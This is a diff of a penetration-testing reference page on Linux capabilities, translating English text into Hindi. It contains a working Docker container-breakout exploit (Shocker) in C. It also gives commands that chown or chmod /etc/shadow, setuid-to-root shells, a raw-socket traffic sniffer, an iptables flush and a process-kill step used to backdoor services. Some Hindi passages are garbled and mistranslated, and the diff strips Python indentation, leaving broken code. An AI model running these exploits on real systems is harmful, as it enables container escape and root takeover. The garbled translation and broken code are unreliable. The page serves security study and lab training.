+fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
+if (de) {
+for (uint32_t i = 0; i < 0xffffffff; ++i) {
+outh.handle_bytes = 8;
+outh.handle_type = 1;
+memcpy(outh.f_handle, & ino, sizeof(ino));
+memcpy(outh.f_handle + 4, & i, sizeof(i));
+if ((i % (1 << 20)) == 0)
+fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
+if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
+closedir(dir);
+close(fd);
+dump_handle( & outh);
+return find_handle(bfd, path, & outh, oh);
+}
+}
+}
+closedir(dir);
+close(fd);
+return 0;
 }
 int main(int argc, char * argv[]) {
-  char buf[0x1000];
-  int fd1, fd2;
-  struct my_file_handle h;
-  struct my_file_handle root_h = {
-    .handle_bytes = 8,
-    .handle_type = 1,
-    .f_handle = {
-      0x02,
-      0,
-      0,
-      0,
-      0,
-      0,
-      0,
-      0
-    }
-  };
-  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
-    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
-    "[***] If you have pending sec consulting, I'll happily [***]\n"
-    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
-  read(0, buf, 1);
-  // get a FS reference from something mounted in from outside
-  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
-    die("[-] open");
-  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
-    die("[-] Cannot find valid handle!");
-  fprintf(stderr, "[!] Got a final handle!\n");
-  dump_handle( & h);
-  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
-    die("[-] open_by_handle");
-  char * line = NULL;
-  size_t len = 0;
-  FILE * fptr;
-  ssize_t read;
-  fptr = fopen(argv[2], "r");
-  while ((read = getline( & line, & len, fptr)) != -1) {
-    write(fd2, line, read);
-  }
-  printf("Success!!\n");
-  close(fd2);
-  close(fd1);
-  return 0;
+char buf[0x1000];
+int fd1, fd2;
+struct my_file_handle h;
+struct my_file_handle root_h = {
+.handle_bytes = 8,
+.handle_type = 1,
+.f_handle = {
+0x02,
+0,
+0,
+0,
+0,
+0,
+0,
+0
+}
+};
+fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
+"[***] The tea from the 90's kicks your sekurity again. [***]\n"
+"[***] If you have pending sec consulting, I'll happily [***]\n"
+"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
+read(0, buf, 1);
+// get a FS reference from something mounted in from outside
+if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
+die("[-] open");
+if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
+die("[-] Cannot find valid handle!");
+fprintf(stderr, "[!] Got a final handle!\n");
+dump_handle( & h);
+if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
+die("[-] open_by_handle");
+char * line = NULL;
+size_t len = 0;
+FILE * fptr;
+ssize_t read;
+fptr = fopen(argv[2], "r");
+while ((read = getline( & line, & len, fptr)) != -1) {
+write(fd2, line, read);
+}
+printf("Success!!\n");
+close(fd2);
+close(fd1);
+return 0;
 }
 ```
+डॉकर कंटेनर से बाहर निकलने के लिए आप होस्ट से फ़ाइल `/etc/shadow` और `/etc/passwd` को **डाउनलोड** कर सकते हैं, उन्हें में एक **नया उपयोगकर्ता** जोड़ सकते हैं, और उन्हें **`shocker_write`** का उपयोग करके अधिलेखित कर सकते हैं। फिर, **ssh** के माध्यम से **पहुंच** सकते हैं।
 
-In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.
-
-**The code of this technique was copied from the laboratory of "Abusing DAC\_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
+**इस तकनीक का कोड "Abusing DAC\_OVERRIDE Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
 
 ## CAP\_CHOWN
 
-**This means that it's possible to change the ownership of any file.**
+**इसका मतलब है कि किसी भी फ़ाइल के स्वामित्व को बदला जा सकता है।**
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change root password**, and escalate privileges:
-
+मान लें कि **`python`** बाइनरी में यह क्षमता है, आप **shadow** फ़ाइल के **स्वामी** को **बदल** सकते हैं, **रूट पासवर्ड बदल** सकते हैं, और विशेषाधिकारों को उन्नत कर सकते हैं:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
-
-Or with the **`ruby`** binary having this capability:
-
+या इस क्षमता के साथ **`ruby`** बाइनरी:
 ```bash
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
-
 ## CAP\_FOWNER
 
-**This means that it's possible to change the permission of any file.**
+**इसका मतलब है कि किसी भी फ़ाइल की अनुमति को बदलना संभव है।**
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-If python has this capability you can modify the permissions of the shadow file, **change root password**, and escalate privileges:
-
+यदि पायथन के पास यह क्षमता है तो आप शैडो फ़ाइल की अनुमतियों को संशोधित कर सकते हैं, **रूट पासवर्ड बदल सकते हैं**, और विशेषाधिकारों को बढ़ा सकते हैं:
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
-
 ### CAP\_SETUID
 
-**This means that it's possible to set the effective user id of the created process.**
+**इसका मतलब है कि नए प्रक्रिया के प्रभावी उपयोगकर्ता आईडी को सेट करना संभव है।**
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-If python has this **capability**, you can very easily abuse it to escalate privileges to root:
-
+यदि पायथन के पास यह **क्षमता** है, तो आप आसानी से इसका दुरुपयोग करके विशेषाधिकारों को रूट तक उन्नयन कर सकते हैं:
 ```python
 import os
 os.setuid(0)
 os.system("/bin/bash")
 ```
-
-**Another way:**
-
+**एक और तरीका:**
 ```python
 import os
 import prctl
@@ -1282,17 +1690,15 @@ prctl.cap_effective.setuid = True
 os.setuid(0)
 os.system("/bin/bash")
 ```
-
 ## CAP\_SETGID
 
-**This means that it's possible to set the effective group id of the created process.**
+**इसका मतलब है कि नए प्रक्रिया के प्रभावी समूह आईडी को सेट करना संभव है।**
 
-There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+यहां बहुत सारी फ़ाइलें हैं जिन्हें आप **उच्चतम अधिकार प्राप्त करने के लिए अधिलेखित कर सकते हैं,** [**आप यहां से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)।
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-In this case you should look for interesting files that a group can read because you can impersonate any group:
-
+इस मामले में, आपको देखना चाहिए कि कौन सी दिलचस्प फ़ाइलें हैं जिन्हें एक समूह पढ़ सकता है क्योंकि आप किसी भी समूह की अनुकरण कर सकते हैं:
 ```bash
 #Find every file writable by a group
 find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
@@ -1301,30 +1707,25 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-
-Once you have find a file you can abuse (via reading or writing) to escalate privileges you can **get a shell impersonating the interesting group** with:
-
+एक बार जब आप एक फ़ाइल को खोज लेते हैं जिसे आप उच्चाधिकार बढ़ाने के लिए दुरुपयोग कर सकते हैं (पढ़ने या लिखने के माध्यम से), तो आप **दिलचस्प समूह की अनुकरण करते हुए एक शेल प्राप्त कर सकते हैं**:
 ```python
 import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-
-In this case the group shadow was impersonated so you can read the file `/etc/shadow`:
-
+इस मामले में समूह shadow की अनुकरण की गई थी, इसलिए आप `/etc/shadow` फ़ाइल को पढ़ सकते हैं:
 ```bash
 cat /etc/shadow
 ```
-
-If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](./#writable-docker-socket).
+यदि **docker** स्थापित है तो आप **docker समूह** का **अनुकरण** कर सकते हैं और इसका दुरुपयोग करके [**docker सॉकेट** के साथ संवाद करके विशेषाधिकारों को बढ़ा सकते हैं](./#writable-docker-socket).
 
 ## CAP\_SETFCAP
 
-**This means that it's possible to set capabilities on files and processes**
+**इसका मतलब है कि फ़ाइलों और प्रक्रियाओं पर क्षमताएँ सेट करना संभव है**
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-If python has this **capability**, you can very easily abuse it to escalate privileges to root:
+यदि python में यह **क्षमता** है, तो आप आसानी से इसका दुरुपयोग करके विशेषाधिकारों को रूट तक बढ़ा सकते हैं:
 
 {% code title="setcapability.py" %}
 ```python
@@ -1347,24 +1748,21 @@ cap_t = libcap.cap_from_text(cap)
 status = libcap.cap_set_file(path,cap_t)
 
 if(status == 0):
-    print (cap + " was successfully added to " + path)
+print (cap + " was successfully added to " + path)
 ```
 {% endcode %}
-
 ```bash
 python setcapability.py /usr/bin/python2.7
 ```
-
 {% hint style="warning" %}
-Note that if you set a new capability to the binary with CAP\_SETFCAP, you will lose this cap.
+ध्यान दें कि यदि आप CAP\_SETFCAP के साथ बाइनरी में एक नई क्षमता सेट करते हैं, तो आप इस क्षमता को खो देंगे।
 {% endhint %}
 
-Once you have [SETUID capability](linux-capabilities.md#cap\_setuid) you can go to its section to see how to escalate privileges.
+जब आपके पास [SETUID क्षमता](linux-capabilities.md#cap\_setuid) होती है, तो आप अधिकारों को बढ़ाने के लिए इसके खंड में जा सकते हैं।
 
-**Example with environment (Docker breakout)**
+**उदाहरण वातावरण के साथ (Docker breakout)**
 
-By default the capability **CAP\_SETFCAP is given to the proccess inside the container in Docker**. You can check that doing something like:
-
+डॉकर कंटेनर के अंदर के प्रोसेस को डिफ़ॉल्ट रूप से क्षमता **CAP\_SETFCAP दी जाती है**। आप ऐसा कुछ करके जांच सकते हैं:
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
 CapInh: 00000000a80425fb
@@ -1372,14 +1770,12 @@ CapPrm: 00000000a80425fb
 CapEff: 00000000a80425fb
 CapBnd: 00000000a80425fb
 CapAmb: 0000000000000000
-                                                                                                                     
-capsh --decode=00000000a80425fb         
+
+capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-
-This capability allow to **give any other capability to binaries**, so we could think about **escaping** from the container **abusing any of the other capability breakouts** mentioned in this page.\
-However, if you try to give for example the capabilities CAP\_SYS\_ADMIN and CAP\_SYS\_PTRACE to the gdb binary, you will find that you can give them, but the **binary won’t be able to execute after this**:
-
+यह क्षमता बाइनरी को **किसी अन्य क्षमता को देने की अनुमति देती है**, इसलिए हम **इस पेज में उल्लिखित किसी भी अन्य क्षमता ब्रेकआउट का दुरुपयोग करके कंटेनर से बाहर निकलने** के बारे में सोच सकते हैं।\
+हालांकि, यदि आप gdb बाइनरी को CAP\_SYS\_ADMIN और CAP\_SYS\_PTRACE क्षमताओं को देने का प्रयास करें, तो आप देने में सक्षम होंगे, लेकिन इसके बाद बाइनरी **वास्तविकता में कार्यान्वित नहीं होगा**:
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1389,27 +1785,25 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-
-After investigating I read this: _Permitted: This is a **limiting superset for the effective capabilities** that the thread may assume. It is also a limiting superset for the capabilities that may be added to the inheri‐table set by a thread that **does not have the CAP\_SETPCAP** capability in its effective set._\
-It looks like the Permitted capabilities limit the ones that can be used.\
-However, Docker also grants the **CAP\_SETPCAP** by default, so you might be able to **set new capabilities inside the inheritables ones**.\
-However, in the documentation of this cap: _CAP\_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
-It looks like we can only add to the inheritable set capabilities from the bounding set. Which means that **we cannot put new capabilities like CAP\_SYS\_ADMIN or CAP\_SYS\_PTRACE in the inherit set to escalate privileges**.
+जांच करने के बाद मैंने यह पढ़ा है: _Permitted: यह एक **प्रभावी क्षमताओं के लिए सीमित सुपरसेट है** जिन्हें थ्रेड अस्मिता कर सकता है। यह एक ऐसी सीमित सुपरसेट भी है जिसके लिए एक थ्रेड द्वारा वार्तालापित सेट में **CAP\_SETPCAP** क्षमता नहीं होती है।_\
+ऐसा लगता है कि Permitted क्षमताएं उन्हें सीमित करती हैं जो उपयोग किए जा सकते हैं।\
+हालांकि, डॉकर भी डिफ़ॉल्ट रूप से **CAP\_SETPCAP** प्रदान करता है, इसलिए आप **विरासत में नई क्षमताएं सेट कर सकते हैं**।\
+हालांकि, इस कैप की दस्तावेज़ीकरण में यह लिखा है: _CAP\_SETPCAP: \[...\] **वार्तालाप करने वाले थ्रेड के बाउंडिंग सेट से कोई भी क्षमता उसकी विरासत में जोड़ सकती है**_।\
+ऐसा लगता है कि हम केवल विरासत में बाउंडिंग सेट से क्षमताओं को जोड़ सकते हैं। जिसका मतलब है कि **हम विरासत में नई क्षमताएं जैसे CAP\_SYS\_ADMIN या CAP\_SYS\_PTRACE को नहीं रख सकते हैं ताकि विशेषाधिकार बढ़ाएं**।
 
 ## CAP\_SYS\_RAWIO
 
-[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to descriptively `perform a range of device-specific operations on other devices`.
+[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक पहुंच, `mmap_min_addr` को संशोधित करें, `ioperm(2)` और `iopl(2)` सिस्टम कॉल का उपयोग करें, और विभिन्न डिस्क कमांड। इस क्षमता के माध्यम से `FIBMAP ioctl(2)` भी सक्षम होता है, जिसने [पिछले](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) में समस्याएं पैदा की हैं। मैन पेज के अनुसार, इसके धारक को अन्य उपकरणों पर विशेष रूप से `विभिन्न उपकरण-विशिष्ट आपरेशन करने` की अनुमति भी होती है।
 
-This can be useful for **privilege escalation** and **Docker breakout.**
+यह **विशेषाधिकार बढ़ाने** और **Docker ब्रेकआउट** के लिए उपयोगी हो सकता है।
 
 ## CAP\_KILL
 
-**This means that it's possible to kill any process.**
+**इसका मतलब है कि किसी भी प्रक्रिया को मारना संभव है।**
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-Lets suppose the **`python`** binary has this capability. If you could **also modify some service or socket configuration** (or any configuration file related to a service) file, you could backdoor it, and then kill the process related to that service and wait for the new configuration file to be executed with your backdoor.
-
+चलो मान लेते हैं कि **`python`** बाइनरी में यह क्षमता है। यदि आप किसी सेवा या सॉकेट कॉन्फ़िगरेशन (या किसी सेवा से संबंधित किसी भी कॉन्फ़िगरेशन फ़ाइल) फ़ाइल को **संशोधित कर सकते हैं**, तो आप उसे बैकडोर कर सकते हैं, और फिर उस सेवा से संबंधित प्रक्रिया को मार सकते हैं और आपके बैकडोर के साथ नई कॉन्फ़िगरेशन फ़ाइल को नया निष्पादित होने का इंतज़ार कर सकते हैं।
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1417,16 +1811,13 @@ import signal
 pgid = os.getpgid(341)
 os.killpg(pgid, signal.SIGKILL)
 ```
+**kill** के साथ Privesc
 
-**Privesc with kill**
-
-If you have kill capabilities and there is a **node program running as root** (or as a different user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.
-
+यदि आपके पास kill क्षमताएं हैं और एक **रूट के रूप में चल रहा है** (या एक अलग उपयोगकर्ता के रूप में) **नोड प्रोग्राम** है, तो आप शायद इसे **सिग्नल SIGUSR1** भेजकर इसे **नोड डीबगर खोलने** के लिए मजबूर कर सकते हैं, जहां आप कनेक्ट कर सकते हैं।
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-
 {% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
 [electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
 {% endcontent-ref %}
@@ -1435,20 +1826,20 @@ kill -s SIGUSR1 <nodejs-ps>
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा कार्यक्रम है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने की मिशन के साथ**, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## CAP\_NET\_BIND\_SERVICE
 
-**This means that it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.
+**इसका मतलब है कि किसी भी पोर्ट पर सुनना संभव है (यहां तक कि विशेषाधिकृत पोर्ट पर भी)।** आप इस क्षमता के साथ सीधे विशेषाधिकारों को बढ़ा नहीं सकते।
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-If **`python`** has this capability it will be able to listen on any port and even connect from it to any other port (some services require connections from specific privileges ports)
+यदि **`python`** के पास इस क्षमता है तो यह किसी भी पोर्ट पर सुन सकेगा और इससे किसी अन्य पोर्ट पर भी कनेक्ट कर सकेगा (कुछ सेवाएं विशेषाधिकारों वाले पोर्ट से कनेक्शन की आवश्यकता होती है)।
 
 {% tabs %}
-{% tab title="Listen" %}
+{% tab title="सुनें" %}
 ```python
 import socket
 s=socket.socket()
@@ -1456,12 +1847,12 @@ s.bind(('0.0.0.0', 80))
 s.listen(1)
 conn, addr = s.accept()
 while True:
-        output = connection.recv(1024).strip();
-        print(output)
+output = connection.recv(1024).strip();
+print(output)
 ```
 {% endtab %}
 
-{% tab title="Connect" %}
+{% tab title="संपर्क करें" %}
 ```python
 import socket
 s=socket.socket()
@@ -1473,25 +1864,22 @@ s.connect(('10.10.10.10',500))
 
 ## CAP\_NET\_RAW
 
-[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to be able to **create RAW and PACKET socket types** for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or **compromised container** to **spoof** **packets** at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.
+[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) एक प्रक्रिया को सक्षम करता है कि वह उपलब्ध नेटवर्क नेमस्पेस के लिए **RAW और PACKET सॉकेट प्रकार** बना सके। इससे उपयुक्त डेटा पैकेट उत्पन्न और प्रेषित किए जा सकते हैं। बहुत सारे मामलों में, यह इंटरफेस एक वर्चुअल ईथरनेट डिवाइस होगा जिससे एक खतरनाक या **संकटमय कंटेनर** विभिन्न नेटवर्क परतों में **पैकेट्स को छलका सकता है**। इस योग्यता वाली एक खतरनाक प्रक्रिया या संकटमय कंटेनर द्वारा उपस्थित ब्रिज में इंजेक्शन कर सकती है, कंटेनरों के बीच मार्गनिर्धारण का शोषण कर सकती है, नेटवर्क पहुंच नियंत्रणों को छलने कर सकती है, और अन्यथा होस्ट नेटवर्किंग के साथ खिलवाड़ कर सकती है यदि फ़ायरवॉल नहीं है जो पैकेट प्रकार और सामग्री को सीमित करने के लिए स्थापित नहीं है। अंत में, यह योग्यता प्रक्रिया को उपलब्ध नेमस्पेस के भीतर किसी भी पते से बाइंड करने की अनुमति देती है। यह योग्यता अधिकारी कंटेनरों द्वारा आमतौर पर रखी जाती है ताकि पिंग को कंटेनर से ICMP अनुरोध बनाने के लिए RAW सॉकेट का उपयोग करके कार्य कर सके।
 
-**This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.
+**इसका मतलब है कि ट्रैफिक को स्निफ़ किया जा सकता है।** इस योग्यता के साथ आप सीधे विशेषाधिकारों को बढ़ा नहीं सकते।
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.
-
+यदि बाइनरी **`tcpdump`** इस योग्यता को रखता है तो आप इसका उपयोग नेटवर्क सूचना कैप्चर करने के लिए कर सकेंगे।
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
+नोट करें कि यदि **पर्यावरण** इस क्षमता को प्रदान कर रहा है तो आप **`tcpdump`** का उपयोग करके ट्रैफिक स्निफ कर सकते हैं।
 
-Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.
+**द्विआधारी 2 के साथ उदाहरण**
 
-**Example with binary 2**
-
-The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" (**localhost**) interface. The code is from the lab "_The Basics: CAP-NET\_BIND + NET\_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
-
+निम्नलिखित उदाहरण **`python2`** कोड है जो "**lo**" (**localhost**) इंटरफेस के ट्रैफिक को अवरोधित करने के लिए उपयोगी हो सकता है। कोड [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) के लैब "_The Basics: CAP-NET\_BIND + NET\_RAW_" से है।
 ```python
 import socket
 import struct
@@ -1499,11 +1887,11 @@ import struct
 flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]
 
 def getFlag(flag_value):
-    flag=""
-    for i in xrange(8,-1,-1):
-        if( flag_value & 1 <<i ):
-            flag= flag + flags[8-i] + ","
-    return flag[:-1]
+flag=""
+for i in xrange(8,-1,-1):
+if( flag_value & 1 <<i ):
+flag= flag + flags[8-i] + ","
+return flag[:-1]
 
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
 s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
@@ -1512,38 +1900,36 @@ s.bind(("lo",0x0003))
 flag=""
 count=0
 while True:
-    frame=s.recv(4096)
-    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
-    proto=ip_header[6]
-    ip_header_size = (ip_header[0] & 0b1111) * 4
-    if(proto==6):
-        protocol="TCP"
-        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
-        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
-        dst_port=tcp_header[0]
-        src_port=tcp_header[1]
-        flag=" FLAGS: "+getFlag(tcp_header[4])
+frame=s.recv(4096)
+ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
+proto=ip_header[6]
+ip_header_size = (ip_header[0] & 0b1111) * 4
+if(proto==6):
+protocol="TCP"
+tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
+tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
+dst_port=tcp_header[0]
+src_port=tcp_header[1]
+flag=" FLAGS: "+getFlag(tcp_header[4])
 
-    elif(proto==17):
-        protocol="UDP"
-        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
-        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
-        dst_port=udp_header[0]
-        src_port=udp_header[1]
+elif(proto==17):
+protocol="UDP"
+udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
+udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
+dst_port=udp_header[0]
+src_port=udp_header[1]
 
-    if (proto == 17 or proto == 6):
-        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
-        count=count+1
+if (proto == 17 or proto == 6):
+print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
+count=count+1
 ```
-
 ## CAP\_NET\_ADMIN + CAP\_NET\_RAW
 
-[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the capability holder to **modify the exposed network namespaces' firewall, routing tables, socket permissions**, network interface configuration and other related settings on exposed network interfaces. This also provides the ability to **enable promiscuous mode** for the attached network interfaces and potentially sniff across namespaces.
+[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) क्षमता धारक को अनावरणित नेटवर्क नेमस्पेस की फ़ायरवॉल, रूटिंग टेबल, सॉकेट अनुमतियों, नेटवर्क इंटरफ़ेस कॉन्फ़िगरेशन और अन्य संबंधित सेटिंग्स को संशोधित करने की अनुमति देती है। इसके अलावा, यह संबंधित नेटवर्क इंटरफ़ेस पर लगे नेटवर्क नेमस्पेस के बीच स्निफ़ करने की क्षमता प्रदान करती है।
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-Lets suppose that the **python binary** has these capabilities.
-
+चलो मान लेते हैं कि **पायथन बाइनरी** के पास ये क्षमताएं हैं।
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1555,18 +1941,16 @@ pprint.pprint(json)
 import iptc
 iptc.easy.flush_table('filter')
 ```
-
 ## CAP\_LINUX\_IMMUTABLE
 
-**This means that it's possible modify inode attributes.** You cannot escalate privileges directly with this capability.
+**इसका मतलब है कि इनोड गुणों को संशोधित किया जा सकता है।** इस क्षमता के साथ आप सीधे विशेषाधिकारों को बढ़ा नहीं सकते।
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**
-
+यदि आपको लगता है कि एक फ़ाइल immutable है और python के पास यह क्षमता है, तो आप **immutable गुण को हटा सकते हैं और फ़ाइल को संशोधन योग्य बना सकते हैं:**
 ```python
 #Check that the file is imutable
-lsattr file.sh 
+lsattr file.sh
 ----i---------e--- backup.sh
 ```
 
@@ -1586,10 +1970,8 @@ fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)
 f=open("/path/to/file.sh",'a+')
 f.write('New content for the file\n')
 ```
-
 {% hint style="info" %}
-Note that usually this immutable attribute is set and remove using:
-
+ध्यान दें कि आमतौर पर यह अविचलनीय गुणवत्ता सेट और हटाने के लिए इस्तेमाल की जाती है:
 ```bash
 sudo chattr +i file.txt
 sudo chattr -i file.txt
@@ -1598,47 +1980,46 @@ sudo chattr -i file.txt
 
 ## CAP\_SYS\_CHROOT
 
-[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permits the use of the `chroot(2)` system call. This may allow escaping of any `chroot(2)` environment, using known weaknesses and escapes:
+[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) चूंकि `chroot(2)` सिस्टम कॉल का उपयोग करने की अनुमति देता है, इससे ज्ञात कमजोरियों और भागों का उपयोग करके किसी भी `chroot(2)` पर्यावरण से बाहर निकलने की अनुमति हो सकती है:
 
-* [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
-* [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)
+* [विभिन्न chroot समाधानों से बाहर निकलने का तरीका](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
+* [chw00t: chroot भागने का उपकरण](https://github.com/earthquake/chw00t/)
 
 ## CAP\_SYS\_BOOT
 
-[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use the `reboot(2)` syscall. It also allows for executing an arbitrary **reboot command** via `LINUX_REBOOT_CMD_RESTART2`, implemented for some specific hardware platforms.
+[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `reboot(2)` सिस्टम कॉल का उपयोग करने की अनुमति देता है। यह विशेष हार्डवेयर प्लेटफॉर्म के लिए `LINUX_REBOOT_CMD_RESTART2` के माध्यम से किसी भी **रीबूट कमांड** को निष्पादित करने की अनुमति देता है।
 
-This capability also permits use of the `kexec_load(2)` system call, which loads a new crash kernel and as of Linux 3.17, the `kexec_file_load(2)` which also will load signed kernels.
